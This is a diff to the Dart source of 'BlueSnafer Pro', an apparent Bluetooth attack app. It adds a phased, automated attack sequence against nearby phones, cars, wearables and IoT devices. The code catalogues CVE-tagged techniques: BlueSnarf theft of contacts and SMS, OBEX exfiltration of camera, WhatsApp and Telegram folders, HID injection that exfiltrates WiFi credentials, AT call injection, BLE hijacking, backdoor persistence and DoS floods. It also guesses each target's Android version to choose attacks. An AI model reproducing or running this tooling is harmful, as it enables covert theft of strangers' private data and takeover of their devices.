@@ -1,4 +1,5 @@
 // BlueSnafer Pro - UI UNIFICADA Y MODERNA
+// ignore_for_file: unused_field, unused_local_variable, unused_import, deprecated_member_use, unnecessary_cast, unused_element, unused_method, avoid_print, camel_case_types
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
@@ -255,6 +256,46 @@ class UnifiedAttackScreen extends StatefulWidget {
 }
 
 class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTickerProviderStateMixin {
+  // ===== CONFIGURACIÓN DE ATAQUES (timeouts, reintentos) =====
+  static const _defaultAttackTimeout = 10000; // 10s por defecto
+  static const _defaultMaxRetries = 2;
+  static const _defaultRetryDelay = 2000; // 2s
+
+  static const Map<String, Map<String, int>> _attackConfigs = {
+    // Reconocimiento
+    'sdp_discover': {'timeout': 5000, 'retries': 1, 'delay': 1000},
+    'full_scan': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+    'mediastore_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+    // Extracción OBEX
+    'file_exfil': {'timeout': 15000, 'retries': 2, 'delay': 3000},
+    'file_exfil_dir': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+    'pbap_extract': {'timeout': 30000, 'retries': 2, 'delay': 3000},
+    // BLE exploits
+    'btlejack': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+    'blur_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
+    'sweyntooth_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
+    'blueborne': {'timeout': 12000, 'retries': 2, 'delay': 2000},
+    'ble_pairing': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+    'ble_exploit': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+    'ble_replay': {'timeout': 12000, 'retries': 1, 'delay': 2000},
+    // Inyección
+    'at_injection': {'timeout': 8000, 'retries': 2, 'delay': 1500},
+    'hid': {'timeout': 10000, 'retries': 2, 'delay': 1500},
+    'hid_inject': {'timeout': 10000, 'retries': 2, 'delay': 1500},
+    'rfcomm_inject': {'timeout': 10000, 'retries': 1, 'delay': 1000},
+    // Bypass
+    'bypass': {'timeout': 8000, 'retries': 2, 'delay': 1500},
+    'pin_crack': {'timeout': 60000, 'retries': 1, 'delay': 0},
+    // Avanzados
+    'mirror_profile': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+    'spoofing': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+    'opp_push': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+    // Persistencia
+    'install_persistence': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+    // DoS
+    'dos': {'timeout': 5000, 'retries': 1, 'delay': 0},
+  };
+
   final RealExploitService _exploitService = RealExploitService();
   final IntegratedAIService _aiService = IntegratedAIService();
   final AttackSuggestionEngine _suggestionEngine = AttackSuggestionEngine();
@@ -350,38 +391,72 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   bool _enableAdaptiveIntelligence = true;
   bool _enablePatternAnalysis = true;
   bool _enableNetworkAnalysis = true;
-  bool _enablePersistence = false;
-  
-  // Métodos de ejecución paralela
-  Future<List<Map<String, dynamic>>> _executeParallelAttacks(
-    List<Map<String, dynamic>> attacks,
-    String address,
-    String displayName,
-  ) async {
-    if (!_enableParallelExecution) {
-      return [];
-    }
-    
-    final futures = attacks.map((attack) async {
-      final type = attack['type'] as String;
-      final command = attack['command'] as String?;
-      final script = attack['script'] as String?;
-      
-      try {
-        final result = await _exploitService.executeAttack(
-          deviceAddress: address,
-          type: type,
-          command: command,
-          script: script,
-        );
-        return {'type': type, 'success': result['success'] == true, 'result': result};
-      } catch (e) {
-        return {'type': type, 'success': false, 'error': e.toString()};
-      }
-    }).toList();
-    
-    return Future.wait(futures);
-  }
+   bool _enablePersistence = false;
+
+  // Adaptive strategy selection
+  String? _deviceFingerprint;
+  Map<String, dynamic>? _reconnaissanceResults;
+  bool _parallelPhase1 = true;   // Run discovery+exfiltration in parallel
+  bool _parallelPhase2 = true;   // Run exploits in parallel
+  bool _deepAnalysis = true;     // Enable EXIF/vCard/DB pattern analysis
+  bool _proactiveRecon = true;   // Enable reconnaissance phase before attacks
+
+   /// Ejecuta ataques agrupados por fase, con paralelismo limitado (max 4 concurrentes por fase)
+   Future<void> _executeParallelAttacks(Map<String, dynamic> device, List<Map<String, dynamic>> techniques) async {
+     final address = device['address'];
+     final displayName = device_utils.getDeviceDisplayName(device);
+
+     // === Agrupar por fase ===
+     final Map<int, List<Map<String, dynamic>>> phases = {};
+     for (final t in techniques) {
+       final phase = (t['phase'] as int?) ?? 99; // Fase 99 = final/OPP
+       phases.putIfAbsent(phase, () => []).add(t);
+     }
+
+     // Ordenar fases ascendentes
+     final sortedPhases = phases.keys.toList()..sort();
+
+     // === Ejecutar cada fase secuencialmente (fases no son paralelas entre sí) ===
+     for (final phase in sortedPhases) {
+       final phaseTechniques = phases[phase]!;
+       if (phaseTechniques.isEmpty) continue;
+
+       _appendLog('📦 FASE $phase: ${phaseTechniques.length} ataques');
+
+       // Decidir si esta fase se ejecuta en paralelo o secuencial
+       // Fases de inyección (4), persistencia (7), OPP (99) → SIEMPRE secuenciales
+       final mustBeSequential = phase == 4 || phase == 7 || phase == 99;
+
+       if (_enableParallelExecution && !mustBeSequential && phaseTechniques.length > 1) {
+         _appendLog('⚡ [PARALLEL] Fase $phase: ${phaseTechniques.length} ataques en paralelo (max 4 concurrentes)');
+         // Ejecutar en lotes de máximo 4 concurrentes para no saturar
+         const maxConcurrent = 4;
+         for (var i = 0; i < phaseTechniques.length; i += maxConcurrent) {
+           if (!_isUnattendedRunning) break;
+           final batch = phaseTechniques.skip(i).take(maxConcurrent).toList();
+           await Future.wait(batch.map((t) => _attack(
+                 t['type'] as String,
+                 command: t['command'] as String?,
+                 script: t['script'] as String?,
+               )));
+           // Pequeña pausa entre lotes para permitir recuperación
+           if (i + maxConcurrent < phaseTechniques.length) {
+             await Future.delayed(const Duration(milliseconds: 500));
+           }
+         }
+       } else {
+         _appendLog('📦 Fase $phase: ${phaseTechniques.length} ataques secuenciales');
+         for (final t in phaseTechniques) {
+           if (!_isUnattendedRunning) break;
+           await _attack(
+             t['type'] as String,
+             command: t['command'] as String?,
+             script: t['script'] as String?,
+           );
+         }
+       }
+     }
+   }
 
   // Todas las técnicas de ataque disponibles (incluyendo CVEs modernos)
   static const allAttackTechniques = [
@@ -389,22 +464,31 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     {'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP', 'cve': '', 'category': 'recon', 'desc': 'Service Discovery Protocol'},
     
     // ===== EXTRACCIÓN DE DATOS (OBEX) =====
-    {'type': 'pbap_extract', 'command': 'contacts', 'name': 'PBAP_CONTACTS', 'cve': '', 'category': 'data', 'desc': 'Phonebook - Contactos'},
-    {'type': 'pbap_extract', 'command': 'call_history', 'name': 'PBAP_CALLS', 'cve': '', 'category': 'data', 'desc': 'Phonebook - Llamadas'},
     {'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'cve': '', 'category': 'data', 'desc': 'Phonebook Completo'},
     {'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Robo contactos OBEX'},
     {'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Calendario'},
-    {'type': 'obex_get', 'command': 'telecom/sms.vpm', 'name': 'BLUESNARF_SMS', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - SMS'},
     {'type': 'file_exfil', 'command': 'scan', 'name': 'OBEX_SCAN', 'cve': '', 'category': 'data', 'desc': 'OBEX FTP Scan'},
-    {'type': 'file_exfil_dir', 'command': 'DCIM', 'name': 'OBEX_DCIM', 'cve': '', 'category': 'data', 'desc': 'OBEX Fotos DCIM'},
-    {'type': 'file_exfil_dir', 'command': 'Pictures', 'name': 'OBEX_PICTURES', 'cve': '', 'category': 'data', 'desc': 'OBEX Pictures'},
-    {'type': 'file_exfil_dir', 'command': 'Download', 'name': 'OBEX_DOWNLOAD', 'cve': '', 'category': 'data', 'desc': 'OBEX Download'},
-    {'type': 'file_exfil_dir', 'command': 'WhatsApp/Media', 'name': 'OBEX_WHATSAPP', 'cve': '', 'category': 'data', 'desc': 'OBEX WhatsApp'},
+    // Directorios de fotos y multimedia (priorizados)
+    {'type': 'file_exfil_dir', 'command': 'DCIM/Camera', 'name': 'OBEX_CAMERA', 'cve': '', 'category': 'data', 'desc': 'Fotos Camara'},
+    {'type': 'file_exfil_dir', 'command': 'DCIM', 'name': 'OBEX_DCIM', 'cve': '', 'category': 'data', 'desc': 'DCIM Completo'},
+    {'type': 'file_exfil_dir', 'command': 'Pictures', 'name': 'OBEX_PICTURES', 'cve': '', 'category': 'data', 'desc': 'Pictures'},
+    {'type': 'file_exfil_dir', 'command': 'Screenshots', 'name': 'OBEX_SCREENSHOTS', 'cve': '', 'category': 'data', 'desc': 'Capturas'},
+    {'type': 'file_exfil_dir', 'command': 'Download', 'name': 'OBEX_DOWNLOAD', 'cve': '', 'category': 'data', 'desc': 'Download'},
+    {'type': 'file_exfil_dir', 'command': 'WhatsApp/Media', 'name': 'OBEX_WHATSAPP', 'cve': '', 'category': 'data', 'desc': 'WhatsApp Media'},
+    {'type': 'file_exfil_dir', 'command': 'Telegram', 'name': 'OBEX_TELEGRAM', 'cve': '', 'category': 'data', 'desc': 'Telegram'},
+    {'type': 'file_exfil_dir', 'command': 'Documents', 'name': 'OBEX_DOCS', 'cve': '', 'category': 'data', 'desc': 'Documentos'},
     {'type': 'file_exfil_dir', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'cve': 'CVE-2009-0244', 'category': 'data', 'desc': 'Directory Traversal OBEX'},
+    
+    // ===== OBEX OVER BLE (MODERNO) =====
+    {'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE', 'cve': '', 'category': 'data_ble', 'desc': 'OBEX via BLE GATT'},
+    
+    // ===== EXTRACCIÓN MEDIASTORE (ANDROID 11+) =====
+    {'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'cve': '', 'category': 'data_mediastore', 'desc': 'Enumerate MediaStore images'},
+    {'type': 'mediastore_extract', 'name': 'MEDIASTORE_EXTRACT', 'cve': '', 'category': 'data_mediastore', 'desc': 'Extract MediaStore file'},
     
     // ===== INYECCIÓN (HID/AT) =====
     {'type': 'at_injection', 'name': 'AT_INJECTION', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Command Injection'},
-    {'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Marcar número'},
+    {'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Marcar numero'},
     {'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir notepad'},
     {'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Exfiltrar WiFi'},
     {'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir terminal'},
@@ -421,6 +505,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     {'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'cve': 'CVE-2020-10135', 'category': 'ble', 'desc': 'BLE Pairing downgrade'},
     {'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'cve': 'CVE-2019-9506', 'category': 'ble', 'desc': 'KNOB attack pairing'},
     {'type': 'ble_replay', 'name': 'BLE_REPLAY', 'cve': '', 'category': 'ble', 'desc': 'BLE GATT replay'},
+    // BLUR + SweynTooth (BLE 5.x modern exploits)
+    {'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'cve': 'CVE-2022-20361', 'category': 'ble', 'desc': 'BLUR - BLE connection hijack'},
+    {'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'cve': 'CVE-2019-17053', 'category': 'ble', 'desc': 'SweynTooth LLID injection'},
     
     // ===== AVANZADOS/MODERNOS =====
     {'type': 'mirror_profile', 'name': 'MIRROR', 'cve': '', 'category': 'advanced', 'desc': 'Mirror Profile clone'},
@@ -441,75 +528,164 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     {'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'cve': '', 'category': 'dos', 'desc': 'L2CAP flood'},
     {'type': 'dos', 'command': 'mtu_crash', 'name': 'DOS_MTU', 'cve': '', 'category': 'dos', 'desc': 'MTU crash'},
     {'type': 'dos', 'command': 'braktooth', 'name': 'BRACKTOOTH', 'cve': 'CVE-2021-28139', 'category': 'dos', 'desc': 'BrakTooth ESP32'},
+    // ===== TÉCNICAS ADICIONALES MODERNAS =====
+    {'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'cve': '', 'category': 'recon', 'desc': 'SDP servicio completo'},
+    {'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf Calendario'},
+    {'type': 'btle_spoof', 'command': 'identity', 'name': 'BLE_SPOOF', 'cve': '', 'category': 'ble', 'desc': 'BLE identity spoofing'},
+    {'type': 'a2dp_exploit', 'name': 'A2DP_EXPLOIT', 'cve': 'CVE-2021-28139', 'category': 'advanced', 'desc': 'A2DP buffer overflow'},
+    {'type': 'l2cap_pwn', 'name': 'L2CAP_PWN', 'cve': '', 'category': 'advanced', 'desc': 'L2CAP pwnage'},
+    {'type': 'hfp_inject', 'script': 'voice', 'name': 'HFP_VOICE', 'cve': '', 'category': 'injection', 'desc': 'HFP voice injection'},
+    {'type': 'gatt_write', 'command': 'exploit', 'name': 'GATT_WRITE', 'cve': '', 'category': 'ble', 'desc': 'GATT characteristic write exploit'},
+    {'type': 'ble_implement', 'name': 'BLE_IMPLEMENT', 'cve': '', 'category': 'ble', 'desc': 'BLE implementation exploit'},
+    {'type': 'rfcomm_exploit', 'name': 'RFCOMM_EXPLOIT', 'cve': '', 'category': 'advanced', 'desc': 'RFCOMM protocol exploit'},
+
+    // ===== PERSISTENCIA =====
+    {'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'cve': '', 'category': 'persistence', 'desc': 'Install backdoor service'},
   ];
 
-  // Estrategia adaptativa por tipo de dispositivo
-  List<Map<String, dynamic>> _getOptimizedAttackSequence(String deviceType) {
-    final strategies = {
-      'smartphone': [
-        {'type': 'sdp_discover', 'command': 'scan'},
-        {'type': 'pbap_extract', 'command': 'all'},
-        {'type': 'file_exfil', 'command': 'scan'},
-        {'type': 'file_exfil_dir', 'command': 'DCIM'},
-        {'type': 'file_exfil_dir', 'command': 'Pictures'},
-        {'type': 'file_exfil_dir', 'command': 'WhatsApp'},
-        {'type': 'at_injection'},
-        {'type': 'hid', 'script': 'wifi'},
-        {'type': 'mirror_profile'},
-        {'type': 'spoofing', 'command': 'BlueSnafer Pro'},
-        {'type': 'full_scan'},
-        {'type': 'bypass', 'command': 'quick_connect'},
-      ],
-      'iot': [
-        {'type': 'sdp_discover', 'command': 'scan'},
-        {'type': 'file_exfil', 'command': 'scan'},
-        {'type': 'btlejack', 'command': 'scan'},
-        {'type': 'btlejack', 'command': 'sniff'},
-        {'type': 'btlejack', 'command': 'jam'},
-        {'type': 'dos', 'command': 'gatt_flood'},
-        {'type': 'dos', 'command': 'l2cap_flood'},
-        {'type': 'full_scan'},
-      ],
-      'laptop': [
-        {'type': 'sdp_discover', 'command': 'scan'},
-        {'type': 'file_exfil', 'command': 'scan'},
-        {'type': 'file_exfil_dir', 'command': 'Documents'},
-        {'type': 'at_injection'},
-        {'type': 'hid', 'script': 'terminal'},
-        {'type': 'hid', 'script': 'reverse'},
-        {'type': 'spoofing', 'command': 'BlueSnafer Pro'},
-        {'type': 'full_scan'},
-        {'type': 'bypass', 'command': 'mac_spoof'},
-      ],
-      'car': [
-        {'type': 'sdp_discover', 'command': 'scan'},
-        {'type': 'btlejack', 'command': 'scan'},
-        {'type': 'btlejack', 'command': 'sniff'},
-        {'type': 'btlejack', 'command': 'hijack'},
-        {'type': 'dos', 'command': 'l2cap_flood'},
-        {'type': 'dos', 'command': 'gatt_flood'},
-        {'type': 'full_scan'},
-      ],
-      'smart_lock': [
-        {'type': 'sdp_discover', 'command': 'scan'},
-        {'type': 'btlejack', 'command': 'sniff'},
-        {'type': 'btlejack', 'command': 'jam'},
-        {'type': 'dos', 'command': 'gatt_flood'},
-        {'type': 'dos', 'command': 'mtu_crash'},
-        {'type': 'full_scan'},
-      ],
-      'wearable': [
-        {'type': 'sdp_discover', 'command': 'scan'},
-        {'type': 'pbap_extract', 'command': 'contacts'},
-        {'type': 'file_exfil', 'command': 'scan'},
-        {'type': 'file_exfil_dir', 'command': 'Pictures'},
-        {'type': 'btlejack', 'command': 'scan'},
-        {'type': 'full_scan'},
-      ],
-    };
-    
-    return strategies[deviceType] ?? strategies['smartphone']!;
-  }
+  // Estrategia adaptativa basada en reconocimiento
+   /// Estrategia adaptativa completa basada en tipo de dispositivo y capacidades detectadas
+   /// Organizada en fases para maximizar eficiencia y minimizar interferencias
+   List<Map<String, dynamic>> _getAdaptiveAttackSequence(String deviceType) {
+     List<Map<String, dynamic>> sequence = [];
+     final deviceInfo = _reconnaissanceResults ?? {};
+     final deviceType_lower = deviceType.toLowerCase();
+
+     // ==========================================
+     // FASE 1: RECONOCIMIENTO (paralelo, no invasivo)
+     // ==========================================
+     sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
+     sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
+
+     // MediaStore solo para Android (rápido, alto valor)
+     if (deviceInfo['androidVersion'] != null) {
+       sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
+     }
+
+     // ==========================================
+     // FASE 2: EXTRACCIÓN DE DATOS (paralelo)
+     // ==========================================
+     final hasObex = deviceInfo['hasObex'] == true;
+     final hasAndroid = deviceInfo['androidVersion'] != null;
+     final isDataCapable = deviceType_lower.contains('smartphone') ||
+         deviceType_lower.contains('tablet') ||
+         deviceType_lower.contains('laptop') ||
+         deviceType_lower.contains('wearable') ||
+         deviceType_lower.contains('car') ||
+         deviceType_lower.contains('unknown') ||
+         deviceType_lower.contains('stub');
+     final isAudioDevice = deviceType_lower.contains('audio') ||
+         deviceType_lower.contains('headset') ||
+         deviceType_lower.contains('speaker') ||
+         deviceType_lower.contains('earbud');
+
+     final shouldTryObex = hasObex || (isDataCapable && !isAudioDevice);
+
+     if (shouldTryObex) {
+       // Scan OBEX primero
+       sequence.add({'type': 'file_exfil', 'command': 'scan', 'name': 'OBEX_SCAN', 'phase': 2, 'timeout': 15000, 'retries': 2});
+       // Directorios priorizados (en orden de valor)
+       final priorityDirs = [
+         'DCIM/Camera',      // Fotos recientes (máximo valor)
+         'DCIM',             // DCIM completo
+         'WhatsApp/Media',   // WhatsApp (alto valor)
+         'Pictures',         // Pictures
+         'Screenshots',      // Capturas de pantalla
+         'Download',         // Descargas
+         'Telegram',         // Telegram
+         'Documents',        // Documentos generales
+       ];
+       for (final dir in priorityDirs) {
+         sequence.add({'type': 'file_exfil_dir', 'command': dir, 'name': 'OBEX_${dir.toUpperCase().replaceAll('/', '_')}', 'phase': 2, 'timeout': 20000, 'retries': 2});
+       }
+     }
+
+     // PBAP para smartphones/tablets/Android/unknown
+     if (deviceType_lower.contains('smartphone') || 
+         deviceType_lower.contains('tablet') || 
+         hasAndroid || 
+         isDataCapable) {
+       sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
+     }
+
+     // ==========================================
+     // FASE 3: BLE EXPLOITS (paralelo, si tiene BLE)
+     // ==========================================
+     if (deviceInfo['hasBle'] == true || deviceType_lower.contains('wearable') || deviceType_lower.contains('car')) {
+       // Escaneo BLE básico
+       sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
+       sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
+       // Ataques BLE modernos
+       sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
+       sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
+       sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
+       // BLE pairing bypass
+       sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+       sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+       sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
+     }
+
+     // ==========================================
+     // FASE 4: INYECCIÓN Y ATAQUES AVANZADOS (secuencial - pueden interferir)
+     // ==========================================
+     // AT Command Injection (si hay soporte AT)
+     if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('car') || hasAndroid) {
+       sequence.add({'type': 'at_injection', 'name': 'AT_INJECTION', 'phase': 4, 'timeout': 8000, 'retries': 2});
+       sequence.add({'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'phase': 4, 'timeout': 5000, 'retries': 1});
+     }
+
+     // HID Injection (teclado humano)
+     if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('laptop')) {
+       sequence.add({'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'phase': 4, 'timeout': 10000, 'retries': 2});
+       sequence.add({'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'phase': 4, 'timeout': 10000, 'retries': 2});
+       sequence.add({'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'phase': 4, 'timeout': 12000, 'retries': 2});
+       sequence.add({'type': 'hid_inject', 'name': 'HID_INJECT', 'phase': 4, 'timeout': 10000, 'retries': 2});
+     }
+
+     // Bluebugging (RFCOMM) - solo si hay OBEX/Phonebook
+     if (shouldTryObex) {
+       sequence.add({'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'phase': 4, 'timeout': 10000, 'retries': 1});
+     }
+
+     // ==========================================
+     // FASE 5: BYPASS DE AUTHENTICACIÓN (paralelo)
+     // ==========================================
+     if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet')) {
+       sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 5, 'timeout': 8000, 'retries': 2});
+       sequence.add({'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'phase': 5, 'timeout': 5000, 'retries': 1});
+       sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 5, 'timeout': 5000, 'retries': 1});
+     }
+
+     // ==========================================
+     // FASE 6: ATAQUES AVANZADOS (paralelo)
+     // ==========================================
+     sequence.add({'type': 'mirror_profile', 'name': 'MIRROR', 'phase': 6, 'timeout': 15000, 'retries': 2});
+     // Full scan ya en fase 1, pero agregar si queremos más exhaustivo
+     // Spoofing de identidad
+     sequence.add({'type': 'spoofing', 'command': 'BlueSnafer Pro', 'name': 'SPOOFING', 'phase': 6, 'timeout': 8000, 'retries': 1});
+
+     // ==========================================
+     // FASE 7: PERSISTENCIA (opcional, después de extracción)
+     // ==========================================
+     if (_enablePersistence && (deviceType_lower.contains('smartphone') || deviceType_lower.contains('car') || deviceType_lower.contains('tablet'))) {
+       sequence.add({'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'phase': 7, 'timeout': 20000, 'retries': 2});
+     }
+
+     // ==========================================
+     // FASE 8: DoS (opcional, si stealth=off)
+     // ==========================================
+     if (!_stealthMode && (deviceInfo['hasBle'] == true || deviceType_lower.contains('iot') || deviceType_lower.contains('smart_lock'))) {
+       sequence.add({'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'phase': 8, 'timeout': 5000, 'retries': 1});
+       sequence.add({'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'phase': 8, 'timeout': 5000, 'retries': 1});
+     }
+
+     // ==========================================
+     // FASE FINAL: OPP Push como fallback (intentar siempre)
+     // ==========================================
+     sequence.add({'type': 'opp_push', 'command': '/sdcard/DCIM/Camera/bluesnafer.jpg', 'name': 'OPP_INJECT', 'phase': 99, 'timeout': 8000, 'retries': 1});
+
+     return sequence;
+   }
 
   // Obtener lista de nombres de técnicas para el reporte
   List<String> _getAttackNames(List<Map<String, dynamic>> attacks) {
@@ -613,6 +789,91 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     return patterns;
   }
 
+  // Reconocimiento proactivo pre-ataque
+  Future<Map<String, dynamic>> _proactiveReconnaissance(String address) async {
+      final info = <String, dynamic>{};
+
+      // Query SDP to detect services
+      try {
+        final sdpResult = await _exploitService.sdpDiscover(address);
+        if (sdpResult['success'] == true) {
+          info['services'] = sdpResult['services'] ?? [];
+          info['hasObex'] = (sdpResult['services'] as List?)?.any((s) =>
+              s.toString().toLowerCase().contains('obex') ||
+              s.toString().toLowerCase().contains('ftp')) ?? false;
+          info['hasBle'] = (sdpResult['services'] as List?)?.any((s) =>
+              s.toString().toLowerCase().contains('ble') ||
+              s.toString().toLowerCase().contains('gatt')) ?? false;
+        }
+      } catch (e) {}
+
+      // Infer capabilities from device name, type, and manufacturer
+      final device = _selectedDevice;
+      if (device != null) {
+        final deviceName = device_utils.getDeviceDisplayName(device);
+        final deviceType = _getDeviceType(device).toLowerCase();
+        final manufacturer = _getManufacturer(device['address'] ?? '');
+
+        // Check if it's an Android-type device (most support OBEX/BLE even if SDP silent)
+        final isAndroidByType = deviceType.contains('smartphone') ||
+            deviceType.contains('tablet') ||
+            deviceType.contains('laptop') ||
+            deviceType.contains('wearable') ||
+            deviceType.contains('car'); // Android Auto
+
+        final isAndroidByName = deviceName.contains('Android') ||
+            deviceName.contains('SM-') ||
+            deviceName.contains('Pixel') ||
+            deviceName.contains('Galaxy') ||
+            deviceName.contains('Note') ||
+            deviceName.contains('OnePlus') ||
+            deviceName.contains('Xiaomi') ||
+            deviceName.contains('Huawei') ||
+            deviceName.contains('Motorola') ||
+            deviceName.contains('LG-') ||
+            deviceName.contains('Sony') ||
+            deviceName.contains('HTC') ||
+            deviceName.contains('Nokia') ||
+            deviceName.contains('Oppo') ||
+            deviceName.contains('Vivo') ||
+            deviceName.contains('Realme');
+
+        final isAndroidByManufacturer = manufacturer == 'APPLE' && deviceName.contains('iPhone') == false ||
+            manufacturer == 'SAMSUNG' ||
+            manufacturer == 'GOOGLE' ||
+            manufacturer == 'XIAOMI' ||
+            manufacturer == 'HUAWEI' ||
+            manufacturer == 'OPPO' ||
+            manufacturer == 'VIVO' ||
+            manufacturer == 'NOKIA' ||
+            manufacturer == 'SONY' ||
+            manufacturer == 'LG' ||
+            manufacturer == 'MOTOROLA' ||
+            manufacturer == 'HTC';
+
+        final isLikelyAndroid = isAndroidByType || isAndroidByName || isAndroidByManufacturer;
+
+        if (isLikelyAndroid) {
+          info['androidVersion'] = 8; // default assumption
+          if (deviceName.contains('Pixel')) info['androidVersion'] = 10;
+          if (deviceName.contains('SM-G95') || deviceName.contains('SM-N95')) info['androidVersion'] = 9;
+          if (deviceName.contains('SM-A7') || deviceName.contains('SM-J7')) info['androidVersion'] = 10;
+          if (deviceName.contains('Galaxy S21') || deviceName.contains('Galaxy S22') || deviceName.contains('Galaxy S23')) info['androidVersion'] = 12;
+          // Most Android devices support OBEX and BLE even if SDP missed them
+          info['hasObex'] = true;
+          info['hasBle'] = true;
+        }
+
+        // Audio devices, beacons, pure peripherals typically don't have OBEX file storage
+        if (deviceType.contains('audio') || deviceType.contains('headset') || deviceType.contains('speaker')) {
+          info['hasObex'] = false;
+          info['hasBle'] = true; // Many modern audio devices have BLE
+        }
+      }
+
+      return info;
+    }
+
   // Extracción de datos de aplicaciones
   Future<int> _extractAppData(String address, String displayName) async {
     if (!_enableNetworkAnalysis) return 0;
@@ -659,7 +920,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     final networkInfo = <String, dynamic>{};
     
     try {
-      // Escanear dispositivos conectados
+      // Escanear dispositivos conectados (ahora real)
       final connectedResult = await _exploitService.executeAttack(
         deviceAddress: address,
         type: 'network_scan',
@@ -670,6 +931,32 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         networkInfo['connected_devices'] = connectedResult['devices'];
         _appendLog('  🌐 ${(connectedResult['devices'] as List?)?.length ?? 0} dispositivos conectados');
       }
+    } catch (e) {
+      networkInfo['connected_devices_error'] = e.toString();
+    }
